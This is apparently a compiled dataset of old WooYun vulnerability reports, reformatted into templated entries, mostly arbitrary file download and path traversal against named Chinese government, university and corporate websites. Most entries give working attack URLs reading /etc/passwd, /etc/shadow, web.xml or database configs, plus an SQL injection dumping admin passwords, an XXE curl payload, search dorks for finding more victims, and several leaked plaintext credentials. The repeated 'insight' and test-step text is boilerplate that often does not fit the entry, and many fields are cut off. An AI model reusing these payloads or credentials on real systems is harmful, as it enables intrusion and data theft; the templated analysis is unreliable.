**详情**: https://**.**.**.**/s?wd=inurl%3A%2Fwebs%2Flist%2Fnotice%2F&pn=90&oq=inurl%3A%2Fwebs%2Flist%2Fnotice%2F&tn=baiduhome_pg&ie=utf-8&rsv_idx=2&rsv_pq=cd589475000136eb&rsv_t=6536L0edwIYegCm8E7xqTjRKV5t%2FUJCmOEejo5UYpxAoXJlE0OiUhTvOybB4v22%2Feuim西南财经大学http://**.**.**.**/webs/download.action?path=WEB-INF/web.xmlhttp://**.**.**.**/webs/download.action?path=/WEB-INF/classes/applicationContext.xml

**POC**: 搜索inurl:webs/download.action**.**.**.**/**.**.**.****.**.**.**/**.**.**.****.**.**.**:1234**.**.**.****.**.**.****.**.**.****.**.**.**---吉首大学http://**.**.**.**/webs/download.action?path=WEB-INF/web.xml长春理工大学http://**.**.**.**/webs/download.action?path=WEB-INF/web.xml基加利教育学院孔子学院http://**.**.**.**/web

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0122873] 掌阅科技敏感信息泄露
**厂商**: zhangyue.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cm.zhangyue.com:80/a.tar.gz源文件泄露涉及mysql账号密码。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删~
---

---
### [wooyun-2015-0161038] 百度某站任意文件下载
**厂商**: 百度 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://youxi.baidu.com/developerDemo/demo.jsp我猜这个页面应该是保密的mask 区域*****^^******************************^^认证之前PO********************y=27dccf180127259d89d********************^^序后，request^********************e0736700serverId=1**********	**********824610124382461e60002，则^**********		**********^时之间以外的全部空格********** **********cf180127259d89d81737e0736**********	**********^^成的MD5值为(全转大^*****http://youxi.ba

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0156524] 西安石油大学分站存在目录遍历学生信息泄露
**厂商**: 西安石油大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/file/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 屏蔽目录访问
---

---
### [wooyun-2015-089595] 乌海市政务公开网存在任意文件下载
**厂商**: 乌海市政府 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 乌海市政务公开网存在任意文件下载。下载地址：http://zwgk.wuhai.gov.cn/servlet/FileDownload?filepath=C%3a%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

**POC**: 证明已给出

**绕过**: 直接利用

**修复**: ，，
---

---
### [wooyun-2012-010436] 某省政府网站任意文件下载，敏感信息泄露
**厂商**: 山西省政府网站 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://shanxi.gov.cn/jsp/cpss/_accessory/http://shanxi.gov.cn/www/.ini.log

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2014-078792] 某会议系统任意文件下载漏洞
**厂商**: cncert国家应急响应中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 程序名称：华思通网络会议官方站点：http://teleuc.com/客户服务热线： 400-9962-600QQ服务热线：675705398漏洞类型：任意文件下载漏洞文件：/main/downloadC03Client.do漏洞参数：downFileName=关键词：华思通网络会议影响用户：提供几个演示：http://meetinglive.teleuc.com//main/downloadC03Client.do?downFileName=../../WEB-INF/web.xml  官方演示http://bgifx.teleuc.com/main/downloadC03Client.do?downFileName=../../WEB-INF/web.xmlhttp://pop136.teleuc.com/main/downloadC03Client.do?downFileName=.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2013-039752] 第一视频集团有限公司某系统任意文件读取漏洞
**厂商**: 第一视频 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件读取http://passport.vodone.com/ids/admin/debug/fv.jsp?f=/../../../../../../../../etc/shadow信息泄露http://passport.vodone.com/ids/admin/debug/env.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-035256] ecshop某分站与主站的一些安全问题合集(SQL注射配置不当等)
**厂商**: ShopEx | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ecshop.cn/respond.php?code=alipay&subject=0&out_trade_no=%00%27%20and%20%28select%20*%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28select%20concat%28user_name,password%29%20from%20ecs_admin_user%20limit%201%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20--%20By%20seay老洞子了 支付宝插件。凭借这一个注入点就可以拖库吧.?我想应该是这样的..然后.com这个域名下有一个配置不当导致任意下载.数据库配置文件下载htt

**POC**: http://www.ecshop.cn/respond.php?code=alipay&subject=0&out_trade_no=%00%27%20and%20%28select%20*%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28select%20concat%28user_name,password%29%20from%20ecs_admin_user%20limit%201%29%29a%20from%20information_schema.tables%20group%20by%2

**绕过**: 直接利用

**修复**: 看着弄吧。
---

---
### [wooyun-2015-0143929] 国海证券官网任意文件读取(xxe漏洞)
**厂商**: 国海证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞详情:WooYun: 东北证券官网任意文件读取漏洞（某通用型系统XXE）curl http://www.ghzq.com.cn/ubsiServlet\?xml\=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%20xxe%20SYSTEM%20%22file%3A%2f%2f%2f%2f%22%3E%5D%3E%3Cubsi%20service%3D%22service%22%20method%3D%22method%22%3E%3Cobject%20type%3D%22Integer%22%3E%26xxe%3B%3C%2fobject%3E%3C%2fubsi%3E%20<object type="null" /><!-- 解析输入XML错误，java.lang.NumberFormatException: For input string: "

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070598] 杭州市人力资源和社会保障网任意文件下载
**厂商**: 杭州市人力资源和社会保障局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hzsrsj.gov.cn/lemis/netweb/detail/download.jsp?url=../lemis/netweb/detail/&filename=download.jsp

**POC**: 如上

**绕过**: 直接利用

**修复**: 无
---

---
### [wooyun-2013-039743] 北京市发展和改革委员会某系统任意文件读取漏洞
**厂商**: 北京市发展和改革委员会 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件读取http://www.bjpc.gov.cn/ids/admin/debug/fv.jsp?f=%5Cweb.xml信息泄露http://www.bjpc.gov.cn/ids/admin/debug/env.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删
---

---
### [wooyun-2016-0171291] 中粮我买某系统存在任意文件下载
**厂商**: 中粮我买网 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中粮我买网用友nc存在任意文件下载地址：http://nc.womaiapp.comnc.womaiapp.com/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml数据库配置信息好了，就这些吧！

**POC**: 中粮我买网用友nc存在任意文件下载地址：http://nc.womaiapp.comnc.womaiapp.com/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml数据库配置信息好了，就这些吧！

**绕过**: 直接利用

**修复**: 打补丁，系统升级
---

---
### [wooyun-2015-0139798] 世纪天成错误配置泄漏敏感信息
**厂商**: 世纪天成 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网：http://www.tiancity.com/homepage/地址：http://dev.qa.tsiv1.mtiancity.com/目录遍历：

**POC**: 加解密密钥:这里泄漏一个token和一个SSL证书 zspush.pem，没有代码不确定什么作用。爆路径：phpinfo()http://dev.qa.tsiv1.mtiancity.com/samples/phpinfo.php

**绕过**: 直接利用

**修复**: 修改配置。
---

---
### [wooyun-2013-028928] 红牛某站点存在任意文件读取暴露数据库信息
**厂商**: 红牛 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: phpcms v9的洞了3点半了 不深入了

**POC**: http://redbullsports.com.cn/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php

**绕过**: 直接利用

**修复**: 你们更专业厂商会送红牛吗？
---

---
### [wooyun-2014-055897] PHP官网任意文件读取漏洞
**厂商**: PHP | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.php.net/cached.php?t=1234&f=index.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0175738] 海康威视某视频接入网关系统通用型设计缺陷(漏洞集合无需登录)
**厂商**: 海康威视 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 多处越权访问：设备类型管理http://xxxxxxxxx:7288/devicetype/取流服务器配置http://xxxxxxx:7288/mediaconfig/信令网关信息http://xxxxxxx:7288/mediastatus/远程升级http://xxxxxxxx:7288/remoteupdate/服务器日志http://xxxxxxx:7288/serverlog/信令服务器配置http://xxxxxxx:7288/signalconfig/信令网关信息http://xxxxxx:7288/signalstatus/转码服务器配置http://xxxxxx:7288/transformserver/用户管理http://xxxxxxxxx:7288/userinfo/任意目录遍历（data/fetchPlugJsonByFolder.php）<?phpinclud

**POC**: 多处越权访问(举例三个例子，更多越权可以请参考案例)：用户管理右键源码可获取明文密码任意目录遍历（data/fetchPlugJsonByFolder.php）Java RMI Registry服务未授权访问导致目录遍历任意目录删除(/data/deletePlugFolder.php)案例：**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/http://**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.**:7288/**.**.**.*

**绕过**: 直接利用

**修复**: 你们懂的。
---

---
### [wooyun-2015-0124837] 金山逍遥某站点任意文件包含漏洞
**厂商**: 金山逍遥 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取：GET /?game=njxib&r=../../../../../../../../../../etc/hosts%00.php HTTP/1.1Referer: http://sj.pay.xoyo.comHost: sj.pay.xoyo.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4Accept: */*

**POC**: # Do not remove the following line, or various programs# that require network functionality will fail.#127.0.0.1	smtp.kingsoft.com	xoyo-173 localhost.localdomain localhost#@::1	smtp.kingsoft.com	localhost6.localdomain6 localhost6114.255.44.156  bjad1.kingsoft.cn#10.19.1.144  14111.tupian.xoyo.com10.

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0104214] 易车某分站配置不当导致各敏感数据泄露
**厂商**: 易车 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 貌似cig.com.cn还有问题，看了下子域得到http://hhb.cig.com.cn  目录遍历dw下有一mysql备份请教狗哥后看了下侧漏信息

**POC**: 回到目录遍历处http://hhb.cig.com.cn/webtrends2.php返回的串base64下DRIVER={WebTrends ODBC Driver};DATABASE=ie24a7q7k1f;SERVER=wa.cig.com.cn;PORT=80;AccountId=1;UID=moliming;PASSWORD=moliming.1;ProfileGuid=jGp8RJOfey6.wlp;SSL=0;访问登陆之admin密码改成了admin，就酱~

**绕过**: 直接利用

**修复**: 统一排查下cig.com.cn吧~
---

---
### [wooyun-2015-0112136] tom某分站存在整站目录遍历，包含敏感信息
**厂商**: TOM在线 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: tom某分站存在整站目录遍历，包含敏感信息

**POC**: 受到WooYun: tom邮箱测试员密码泄露可间接导致内部员工邮件信息泄露的启发，发现该站文件存在遍历问题，例如http://mail.tom.com/info/网站模板页面http://mail.tom.com/info/ad/welcomead.htm之前作者提到的信息在这里http://mail.tom.com/info/ad/mailpop-dzm/用户名：aihuichuanshuo@tom.com密码：aihui.789<div id="popupDivgame" style="z-index: 999999999; display: none; position: absolut

**绕过**: 直接利用

**修复**: 删除铭感信息文件，文件目录加权限
---

---
### [wooyun-2015-0141476] 四川政府大量在用系统任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞存在于 /servlet/FileUploadServlet?fileName=xxxx例如 http://**.**.**.**:8080/servlet/FileUploadServlet?fileName=../WEB-INF/proxool.xml

**POC**: 别的案例还有http://**.**.**.**:8080/servlet/FileUploadServlet?fileName=../WEB-INF/proxool.xmlhttp://**.**.**.**:8080/servlet/FileUploadServlet?fileName=../WEB-INF/proxool.xmlhttp://**.**.**.**:8080/servlet/FileUploadServlet?fileName=../WEB-INF/proxool.xmlhttp://**.**.**.**:8080/servlet/FileUploadServlet?f

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-077960] JEECMS任意文件下载导致敏感信息泄露
**厂商**: JEECMS | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 应该是JEECMS旧版本inurl:download.jspx?path=任意文件下载download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml案例1www.xxczj.gov.cn/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml案例2www.zzcz.gov.cn/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml

**POC**: 案例3ww.pyblr.gov.cn/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml案例4home.chgh.org.tw/chgh/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml案例5218.28.122.130/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml案例6www.hbcdc.com.cn/download.jspx?fpath=WEB-INF/web.xml&fi

**绕过**: 直接利用

**修复**: 文件参数过滤
---

---
### [wooyun-2015-091150] 07073游戏网主站任意文件读取漏洞（passwd文件泄漏）
**厂商**: 07073.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 07073游戏网主站任意文件读取漏洞（passwd文件泄漏）

**POC**: 主站，可是主站呀，任意文件包含，夜深了就不getshell 了，网速也不好。POChttp://www.07073.com/api/loadview.php?dopost=view&templet=../../../../../../etc/passwdTemplate Not Found! /www/wwwroot/www.07073.com/templets/.xxxx结合爆路径，网站爬虫后，遍历全网站文件，getshell毫无压力好不好。rank不能少~

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-038172] 动网先锋网络大量游戏后台泄露(第三方dede风险较高，附猜测过程)
**厂商**: uwan.com | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 后台管理

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 动网先锋  www.uwan.com大量游戏后台泄露   为何泄露个地址我也提交？  因为它是织梦！织梦泄露后台地址的影响不多说 起因是一个文件下载引起  上图：Dedecms敏感路径泄漏http://qx.uwan.com/data/mysql_error_trace.inc流行CMS程序识别dedecms   mysql_error_trace.inc这个文件直接下载Page: /qx_uwan_admin/login.php  域名：http://qx.uwan.com/  组合：http://qx.uwan.com/qx_uwan_admin/login.php那么 一次类推呢？http://lun.uwan.com/lun_uwan_admin/login.phphttp://wz.uwan.com/wz_uwan_admin/login.phphttp://xia.uwan.c

**POC**: http://xia.uwan.com/xia_uwan_admin/login.php。。。。。

**绕过**: 直接利用

**修复**: 改。
---

---
### [wooyun-2011-03783] 360游戏中心任意文件下载漏洞
**厂商**: 奇虎360 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 未对用户输入正确执行危险字符清理 或未检查用户输入中是否包含“..”（两个点）字符串 ，导致信息泄露http://wan.360.cn/bbs/second.html?g=/../../../../../../../../../../../../etc/passwd%00.html

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 确保请求的文件驻留于 Web 服务器的虚拟路径中，限制对/etc/passwd的访问
---

---
### [wooyun-2014-066795] 多所高校和科研机构某系统任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 三才期刊采编系统 存在任意文件下载漏洞示例：http://www.jdxb.cn/oa/pdfdow.aspx?Type=pdf&FileName=../../Web.configGoogle: inurl:/oa/pdfdow.aspx?Type=pdf问题代码：/oa/pdfdow.aspx.cselse if (Request.QueryString["Type"] == "pdf"){if (!string.IsNullOrEmpty(Request.QueryString["FileName"])){string openulr = Server.MapPath(strPath + "/" + Request.QueryString["FileName"].ToString());if (File.Exists(openulr)){System.IO.Stream iStream

**POC**: 找一个网站近一步测试xbskb.jssvc.edu.cn下载网站配置文件：http://xbskb.jssvc.edu.cn/oa/pdfdow.aspx?Type=pdf&FileName=../../Web.config找到数据库信息数据库连的是本机，正好其1433端口对外开放，连之

**绕过**: 直接利用

**修复**: 对文件读取目录做限制，且对FileName做过滤
---

---
### [wooyun-2014-060163] 91某业务站点存在文件包含漏洞
**厂商**: 福建网龙 | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在文件包含的站点：http://diy.91.com对http://diy.91.com/login.php 测试，无果。通过目录遍历得到：diy.91.com/tools/log/post:logtype=../../../../../../../../../../etc/passwd%00.jpg

**POC**: (见原文)

**绕过**: 直接利用

**修复**: logtype参数进行限制，猜测应该是include $_POST[logtype].".php" ..php被%00截断了。。你们的php版本较低。。可以的话做下升级吧。
---

---
### [wooyun-2014-058487] 深澜软件漏洞SrunDisk任意文件下载
**厂商**: srun.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: if($res=$shared->gets("","file_type DESC")){foreach($res as $k => $v){$shid=$v["shid"];$path=$v["path"];if(!is_file($path)){$shared->path=$path;$shared->del();continue;}$path1=substr(strrchr($path,"/"),1);$file_time=date("Y-m-d H:i:s",filemtime($path));$member_id=$v["member_id"];$member_name=$v["member_name"];$type=$res[0]["file_type"];$url="user_space.php?username=".$username."&act=shared_show&pa

**POC**: 漏洞证明：http://218.75.75.92/user_space.php?username=zaizai&act=shared_show&path=../../../../../../../../../etc/passwd

**绕过**: 编码绕过

**修复**: 看了下代码几乎没有过滤,太含糊把。
---

---
### [wooyun-2013-019327] ZTE中兴SUPPORT站文件下载漏洞
**厂商**: ZTE中兴 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进入SUPPORT站后随意注册一个帐号,然后打开下面的页面http://support.zte.com.cn/support/FileCenter/SptDownload.aspx?path=c:\WINDOWS\system32\drivers\etc\hosts&fileName=addd.txt&type=tsm可以把hosts文件下载下来

**POC**: curl 'http://support.zte.com.cn/support/FileCenter/SptDownload.aspx?path=c:\WINDOWS\system32\drivers\etc\hosts&fileName=addd.txt&type=tsm'# Copyright (c) 1993-1999 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025239] 江苏电信多分站任意文件下载漏洞,源码反编译可进入后台
**厂商**: 江苏电信 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 先来个泄漏敏感信息的。http://wap.91ac.com/ 直接爆错，物理路径完美测漏2. 第一个分站的任意文件下载漏洞。http://kfgd.icartoons.cn:8080/help.download?isAbsolute=false&path=WEB-INF/web.xml直接下载无压力，自己下载反编译了几个文件，数据库密码泄漏。以及登录时处理的逻辑好像有问题，貌似只要知道一个工号就能顺利登录（这里只是猜测，工号不知道怎么编的）3. 这个渠道结算支撑系统 http://125.77.198.26:9002/channelaccount/login!toLogin.do直接admin' or '1'='1  完美后插同样，这个系统也存在任意文件下载漏洞。http://125.77.198.26:9002/channelaccount/download.do?filenam

**POC**: 1.2.3.

**绕过**: 直接利用

**修复**: 自己找技术支持解决~~ 程序员该拖出去弹JJ。
---

---
### [wooyun-2015-0118653] 中国科学技术协会分站俩处任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://app01.cast.org.cn:7050/download/download.jsp?filepath=/WEB-INF/web.xmlhttp://kpym.cast.org.cn/web/download.jsp?fileName=../WEB-INF/web.xml<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE web-app PUBLIC"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN""http://java.sun.com/dtd/web-app_2_3.dtd"><web-app><listener><listener-class>com.jalor.session.SessionListener</listener-class></lis

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-092522] TCL某系统弱口令及任意文件下载
**厂商**: TCL官方网上商城 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://218.106.129.23:8080/1.存在问题的系统如下；2.弱口令admin，111111；3.任意文件下载；

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-060302] 重庆市教育考试院OA系统任意文件下载（可/etc/passwd）
**厂商**: 重庆市教育考试院 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.cqksy.cnhttp://www.cqksy.cn/oa/common/getFile.jsp?realpath=/../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 目录权限严格设置
---

---
### [wooyun-2014-087532] 中国教育网dns服务器任意文件下载泄露危险信息
**厂商**: 中国教育网 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接访问http://dns1.hosting.edu.cn 就可进入网站目录下载后台备份(10ms.tar),进而获得phpmyadmin登录密码及网络部署信息（list20121114.xls)，进入后台数据库，此外还存在可下载其他网站备份。

**POC**: 后台用户名 密码登入phpmyadmin泄露的其他信息

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0133355] 浙江电信手机某系统任意文件下载
**厂商**: 浙江电信 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.e-189.com/的下载中心http://www.e-189.com/webcontext_v2/download/dlist/dAndroid.jsp构造下载链接http://www.e-189.com/UploadServlet?id=../../../../../../../../../../../../../../etc/passwdhttp://www.e-189.com/UploadServlet?id=../../../../../../../../../../../../../../etc/shadowhttp://www.e-189.com/UploadServlet?id=../../../../../../../../../../../../../../root/.bash_history

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2013-022715] 甘肃电信的一个任意文件下载
**厂商**: 甘肃电信 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 甘肃电信189网上营业厅任意文件下载

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-03744] 国人通信WAPI无线网络设备登陆验证绕过漏洞
**厂商**: 国人通信 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国人通信某型号WAPI无线网络设备存在登陆验证绕过漏洞

